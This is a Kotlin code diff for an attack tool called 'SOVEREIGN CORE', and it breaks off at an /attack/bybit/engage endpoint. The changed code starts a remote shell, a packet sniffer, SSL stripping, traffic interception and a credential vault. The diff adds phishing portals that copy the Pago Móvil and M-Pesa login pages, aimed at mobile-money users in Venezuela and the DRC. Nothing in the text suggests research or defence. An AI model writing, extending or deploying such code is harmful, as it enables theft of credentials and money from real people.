@@ -5,12 +5,14 @@ import io.javalin.Javalin
 import java.time.Instant
 
 fun main(args: Array<String>) {
-    println("✅ SOVEREIGN CORE v2.1 boot OK @ ${Instant.now()}")
+    println("✅ SOVEREIGN CORE v2.2 (MULTI-TARGET) boot OK @ ${Instant.now()}")
 
+    // 1. Initialisation des Sentinelles
     val gatekeeper = Gatekeeper()
     val killSwitch = KillSwitch()
     val port = args.firstOrNull()?.toIntOrNull() ?: 7070
 
+    // 2. Instanciation des unités de combat
     val rotator = EncryptionKeyRotator()
     val vault = SecurityVault() 
     val interceptor = FinCapInterception()
@@ -22,21 +24,35 @@ fun main(args: Array<String>) {
     val trafficMirror = TrafficMirror()
     val sslStripper = SSLStripper()
     val proxyCapture = ProxyInterceptor(vault)
-    val phish = PhishCommander(vault)
+    
+    // Modules de Phishing (VEN & RDC)
+    val phishVen = PhishCommander(vault)
+    val phishRdc = MPesaCommander(vault)
 
+    // 3. Activation des services persistants
     rotator.startRotation()
     interceptor.runInterceptionMode()
     resilience.monitorSystem()
     remoteShell.startShell(9090)
     packetSniffer.startSniffing(9999)
 
+    // 4. Démarrage du Dashboard Souverain
     val app = Javalin.create().start(port)
-    phish.setupPhishPage(app)
+    
+    // Enregistrement des portails captifs
+    phishVen.setupPhishPage(app)  // Route: /login/pagomovil
+    phishRdc.setupMPesaPage(app)  // Route: /login/mpesa
 
     println("🛡️ TUNNEL SÉCURISÉ ACTIF SUR LE PORT $port")
+    println("📡 CIBLES DISPONIBLES : Pago Móvil & M-Pesa")
 
+    // 5. Endpoints de contrôle
     app.get("/status") { ctx ->
-        ctx.json(mapOf("status" to "COMBAT_READY", "version" to "2.1-PHISH"))
+        ctx.json(mapOf(
+            "status" to "COMBAT_READY", 
+            "version" to "2.2-MULTI",
+            "active_portals" to listOf("PagoMovil", "M-Pesa")
+        ))
     }
 
     app.get("/attack/bybit/engage") { ctx ->
